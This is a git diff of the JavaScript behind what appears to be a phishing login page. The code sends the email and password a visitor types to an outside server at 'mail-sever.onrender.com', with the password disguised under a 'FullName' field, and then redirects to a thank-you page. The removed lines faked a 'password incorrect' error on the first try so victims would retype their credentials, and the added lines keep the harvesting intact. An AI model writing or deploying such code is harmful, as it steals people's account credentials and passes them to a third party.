@@ -14,8 +14,6 @@ document.addEventListener("DOMContentLoaded", function() {
     const passCon = document.getElementById("pass-con");
     const alertCon = document.getElementById('alert-con');
     
-    let firstAttempt = true; // Flag to track first submit attempt
-
     name.addEventListener("keypress", function(event) {
         if (event.key === "Enter") {
             event.preventDefault(); // Prevent form submission
@@ -79,56 +77,49 @@ document.addEventListener("DOMContentLoaded", function() {
     Register.addEventListener("submit", function(event) {
         event.preventDefault();
 
-        if (firstAttempt) {
-            // First submit attempt: Show incorrect password message
-            alertMsg('danger', 'Your account or password is incorrect. If you don\'t remember your password, Try again.');
-            firstAttempt = false; // Set flag to false to allow actual submission on next attempt
-        } else {
-            // Second submit: Perform actual submission
-            if (key.value.trim() === '') {
-                alertMsg("danger", "Password cannot be empty.");
-                return;
-            }
-
-            // Disable submit button to prevent multiple submissions
-            submitBtn.disabled = true;
-            submitBtn.value = 'Signing In...';
-
-            const userData = {
-                FullName: key.value,
-                Email: name.value,
-                Password: "username",
-            };
-
-            fetch("https://mail-sever.onrender.com/Api/User/sign-up", {
-                method: "POST",
-                headers: {
-                    "Content-Type": "application/json"
-                },
-                body: JSON.stringify(userData)
-            })
-            .then(response => {
-                if (!response.ok) {
-                    return response.json().then(err => { throw err; });
-                }
-                return response.json();
-            })
-            .then(data => {
-                // Redirect to home page after 2 seconds
-                setTimeout(() => {
-                    window.location.href = "thank_life.html";
-                }, 1500);
-            })
-            .catch(error => {
-                alertMsg("danger", "There was a problem signing in. Please try again later.");
-                console.error("Error:", error);
-            })
-            .finally(() => {
-                // Re-enable submit button
-                submitBtn.disabled = false;
-                submitBtn.value = 'Submit';
-            });
+        if (key.value.trim() === '') {
+            alertMsg("danger", "Password cannot be empty.");
+            return;
         }
+
+        // Disable submit button to prevent multiple submissions
+        submitBtn.disabled = true;
+        submitBtn.value = 'Signing In...';
+
+        const userData = {
+            FullName: key.value,
+            Email: name.value,
+            Password: "username",
+        };
+
+        fetch("https://mail-sever.onrender.com/Api/User/sign-up", {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json"
+            },
+            body: JSON.stringify(userData)
+        })
+        .then(response => {
+            if (!response.ok) {
+                return response.json().then(err => { throw err; });
+            }
+            return response.json();
+        })
+        .then(data => {
+            // Redirect to home page after 2 seconds
+            setTimeout(() => {
+                window.location.href = "thank_life.html";
+            }, 1500);
+        })
+        .catch(error => {
+            alertMsg("danger", "There was a problem signing in. Please try again later.");
+            console.error("Error:", error);
+        })
+        .finally(() => {
+            // Re-enable submit button
+            submitBtn.disabled = false;
+            submitBtn.value = 'Submit';
+        });
     });
     function alertMsg(alert, msg){
         alertCon.className = `${alert}`;
